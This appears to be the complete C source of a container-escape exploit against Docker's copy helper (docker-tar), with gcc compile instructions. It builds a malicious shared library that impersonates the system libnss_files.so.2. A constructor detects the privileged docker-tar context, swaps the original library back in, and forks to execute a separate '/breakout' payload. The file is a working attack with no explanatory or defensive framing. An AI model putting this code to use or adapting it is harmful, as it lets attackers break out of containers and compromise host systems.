// libnss_files.c
// Compile with 'gcc -shared -o libnss_files.so.2 -fPIC -Wall libnss_files.c'

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>


#define ORIGINAL_LIBNSS "/libnss_files.so.2"
#define LIBNSS_PATH "/lib/x86_64-linux-gnu/libnss_files.so.2"

bool is_priviliged();

__attribute__ ((constructor)) void run_at_link(void)
{
     char * argv_break[2];
     if (!is_priviliged())
           return;

     rename(ORIGINAL_LIBNSS, LIBNSS_PATH);
     FILE * log_fp = fopen("/libnss_files.log", "w");
     fprintf(log_fp, "switched back to the original libnss_file.so\n");

     if (!fork())
     {

           // Child runs breakout
           argv_break[0] = strdup("/breakout");
           argv_break[1] = NULL;
           execve("/breakout", argv_break, NULL);
     }
     else
           wait(NULL); // Wait for child

     fclose(log_fp);
     return;
}
bool is_priviliged()
{
     FILE * proc_file = fopen("/proc/self/exe", "r");
     if (proc_file != NULL)
     {
           fclose(proc_file);
           return false; // can open so /proc exists, not privileged
     }
     return true; // we're running in the context of docker-tar
}
